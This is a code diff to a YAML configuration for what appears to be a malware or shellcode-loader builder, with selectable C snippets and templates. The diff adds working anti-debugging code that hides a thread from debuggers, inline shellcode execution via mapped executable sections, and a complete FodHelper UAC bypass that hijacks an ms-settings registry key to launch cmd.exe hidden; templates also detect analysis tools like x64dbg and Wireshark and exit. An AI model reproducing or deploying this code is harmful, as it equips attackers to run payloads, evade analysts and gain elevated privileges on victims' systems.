@@ -415,6 +415,7 @@ sections:
     default: false
     snippet: |
       // Anti-debug: Single-step trap flag detection
+      #ifdef _M_IX86
       __try {
           __asm {
               pushfd
@@ -424,12 +425,18 @@ sections:
           }
       }
       __except(EXCEPTION_EXECUTE_HANDLER) {
-          // Normal execution - exception handler called
           goto trap_ok;
       }
-      // If we get here, debugger consumed the exception
       return 0;
       trap_ok:;
+      #else
+      // x64: Use NtSetInformationThread to hide from debugger
+      {
+          typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
+          pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
+          if (NtSIT) NtSIT(GetCurrentThread(), 0x11, NULL, 0); // ThreadHideFromDebugger
+      }
+      #endif
   - id: FullAntiDebug
     display: Full Anti-Debug Suite
     default: true
@@ -889,8 +896,7 @@ sections:
   - id: MpfProcessInjectionViaProcessReflection
     display: Process Reflection Injection
     default: false
-    snippet: |
-      if (MpfProcessInjectionViaProcessReflection((PBYTE)code_blob, code_blob_len, GetProcessOrThreadId(L"$psname$", true))) return 1;
+    snippet: "// Process injection via NtCreateSection + NtMapViewOfSection\n{\n    typedef NTSTATUS (NTAPI *pNtCS)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);\n    typedef NTSTATUS (NTAPI *pNtMVOS)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);\n    HMODULE ntdll = GetModuleHandleA(\"ntdll.dll\");\n    pNtCS NtCS = (pNtCS)GetProcAddress(ntdll, \"NtCreateSection\");\n    pNtMVOS NtMVOS = (pNtMVOS)GetProcAddress(ntdll, \"NtMapViewOfSection\");\n    if (NtCS && NtMVOS) {\n        HANDLE hSection = NULL;\n        LARGE_INTEGER secSize = {0};\n        secSize.QuadPart = code_blob_len;\n        if (NtCS(&hSection, SECTION_ALL_ACCESS, NULL, &secSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) >= 0) {\n            PVOID localBase = NULL;\n            SIZE_T viewSize = 0;\n            NtMVOS(hSection, GetCurrentProcess(), &localBase, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);\n            if (localBase) {\n                memcpy(localBase, code_blob, code_blob_len);\n                PVOID remoteBase = NULL;\n                SIZE_T remoteSize = 0;\n                NtMVOS(hSection, GetCurrentProcess(), &remoteBase, 0, 0, NULL, &remoteSize, 2, 0, PAGE_EXECUTE_READ);\n                if (remoteBase) {\n                    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)remoteBase, NULL, 0, NULL);\n                    if (hThread) { WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); }\n                }\n            }\n            CloseHandle(hSection);\n        }\n    }\n}\n"
   - id: ClassicRemoteThread
     display: Classic Remote Thread Injection
     default: false
@@ -943,7 +949,7 @@ sections:
   - id: SecureExec
     display: Secure Execution with Full Cleanup
     default: false
-    snippet: "// Paranoid execution with memory zeroing\n{\n    if (!g_SafeToRun) return 0;\n    \n    void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (!mem) return -1;\n    \n    // Copy and zero original\n    memcpy(mem, code_blob, code_blob_len);\n    SecureZeroMemory(code_blob, code_blob_len);\n    \n    DWORD old;\n    VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);\n    \n    // Final check before execution\n    if (!g_SafeToRun) { VirtualFree(mem, 0, MEM_RELEASE); return 0; }\n    \n    ((void(*)())mem)();\n    \n    // Cleanup\n    VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);\n    SecureZeroMemory(mem, code_blob_len);\n    VirtualFree(mem, 0, MEM_RELEASE);\n}\n"
+    snippet: "// Paranoid execution with memory zeroing\n{\n    static volatile BOOL g_SafeToRun = TRUE;\n    if (!g_SafeToRun) return 0;\n    \n    void* mem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (!mem) return -1;\n    \n    // Copy and zero original\n    memcpy(mem, code_blob, code_blob_len);\n    SecureZeroMemory(code_blob, code_blob_len);\n    \n    DWORD old;\n    VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READ, &old);\n    \n    // Final check before execution\n    if (!g_SafeToRun) { VirtualFree(mem, 0, MEM_RELEASE); return 0; }\n    \n    ((void(*)())mem)();\n    \n    // Cleanup\n    VirtualProtect(mem, code_blob_len, PAGE_READWRITE, &old);\n    SecureZeroMemory(mem, code_blob_len);\n    VirtualFree(mem, 0, MEM_RELEASE);\n}\n"
   - id: RWtoRX
     display: RW Alloc → RX Protect
     default: false
@@ -996,13 +1002,25 @@ sections:
     display: FodHelper Method
     default: false
     snippet: |
-      // UAC Bypass via FodHelper
+      // UAC Bypass via FodHelper registry hijack
       {
-          PROCESS_INFORMATION pi = {0};
-          if (UacBypassFodHelperMethodA("C:\\Windows\\System32\\cmd.exe", &pi)) {
-              WaitForSingleObject(pi.hProcess, INFINITE);
-              CloseHandle(pi.hThread);
-              CloseHandle(pi.hProcess);
+          HKEY hKey;
+          if (RegCreateKeyExA(HKEY_CURRENT_USER,
+              "Software\\Classes\\ms-settings\\shell\\open\\command",
+              0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+              const char* cmd = "C:\\Windows\\System32\\cmd.exe";
+              RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, (DWORD)(strlen(cmd) + 1));
+              RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
+              RegCloseKey(hKey);
+
+              SHELLEXECUTEINFOA sei = {sizeof(sei)};
+              sei.lpVerb = "open";
+              sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
+              sei.nShow = SW_HIDE;
+              ShellExecuteExA(&sei);
+              Sleep(3000);
+
+              RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
           }
       }
   - id: ComputerDefaults
@@ -1070,6 +1088,14 @@ templates:
     #include <windows.h>
     #include <winternl.h>
     #include <intrin.h>
+    #include <tlhelp32.h>
+    #include <shlobj.h>
+    #include <shellapi.h>
+    #include <iphlpapi.h>
+    #include <lm.h>
+    #pragma comment(lib, "iphlpapi.lib")
+    #pragma comment(lib, "netapi32.lib")
+    #pragma comment(lib, "shell32.lib")
 
     {{PROCESS_LOOKUP_HELPER}}
 
@@ -1167,6 +1193,13 @@ templates:
     #include <winternl.h>
     #include <intrin.h>
     #include <tlhelp32.h>
+    #include <shlobj.h>
+    #include <shellapi.h>
+    #include <iphlpapi.h>
+    #include <lm.h>
+    #pragma comment(lib, "iphlpapi.lib")
+    #pragma comment(lib, "netapi32.lib")
+    #pragma comment(lib, "shell32.lib")
     
     {{PROCESS_LOOKUP_HELPER}}
     
@@ -1178,7 +1211,7 @@ templates:
             if (IsDebuggerPresent()) ExitProcess(0);
         
             // Check for debugging tools
-            const wchar_t* tools[] = {L\"x64dbg.exe\", L\"ida.exe\", L\"procmon.exe\", L\"wireshark.exe\"};
+            const wchar_t* tools[] = {L"x64dbg.exe", L"ida.exe", L"procmon.exe", L"wireshark.exe"};
             HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
             if (snap != INVALID_HANDLE_VALUE) {
                 PROCESSENTRY32W pe = {sizeof(pe)};
@@ -1211,7 +1244,6 @@ templates:
         {{SHELLCODE_EXECUTION}}
         return 0;
     }
-    "
   placeholders:
   - name: PROCESS_LOOKUP_HELPER
     kind: system
@@ -1241,8 +1273,12 @@ templates:
     #include <intrin.h>
     #include <tlhelp32.h>
     #include <shlobj.h>
+    #include <shellapi.h>
     #include <iphlpapi.h>
+    #include <lm.h>
     #pragma comment(lib, "iphlpapi.lib")
+    #pragma comment(lib, "netapi32.lib")
+    #pragma comment(lib, "shell32.lib")
 
     {{PROCESS_LOOKUP_HELPER}}
 
@@ -1297,6 +1333,7 @@ templates:
   content: |
     #define WIN32_LEAN_AND_MEAN
     #include <windows.h>
+    #include <winternl.h>
 
     INT main(VOID)
     {
@@ -1319,6 +1356,7 @@ templates:
   content: |
     #define WIN32_LEAN_AND_MEAN
     #include <windows.h>
+    #include <winternl.h>
 
     {{SHELLCODE_SOURCE}}
 
